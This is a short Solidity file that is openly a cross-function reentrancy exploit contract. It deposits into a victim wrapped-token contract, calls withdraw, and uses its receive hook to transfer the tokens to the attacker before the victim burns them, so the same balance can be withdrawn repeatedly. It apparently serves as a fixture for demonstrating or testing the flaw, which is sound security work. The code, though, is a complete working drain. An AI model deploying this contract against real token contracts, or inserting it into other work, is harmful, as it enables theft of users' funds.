// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface IWrappedToken {
  function deposit(uint256 amount) external payable;
  function withdraw() external;
  function transfer(address to, uint256 value) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

/**
 * @dev Deposits an amount and withdraws it. When `victim` sends ETH, `receive` runs and transfers the tokens to
 * `attacker` before `victim` burns them. `victim` then burns 0 tokens, so `attacker` can withdraw the same amount again.
 * It does not re-enter `withdraw`, so a lock that only protects `withdraw` does not stop it.
 */
contract CrossFunctionReentrancyAttacker {
  IWrappedToken public immutable victim;
  address public immutable attacker;

  constructor(IWrappedToken victim_) {
    victim = victim_;
    attacker = msg.sender;
  }

  function attack() external payable {
    victim.deposit{value: msg.value}(msg.value);
    victim.withdraw();

    (bool success, ) = attacker.call{value: address(this).balance}("");
    require(success, "ETH transfer failed");
  }

  receive() external payable {
    victim.transfer(attacker, victim.balanceOf(address(this)));
  }
}
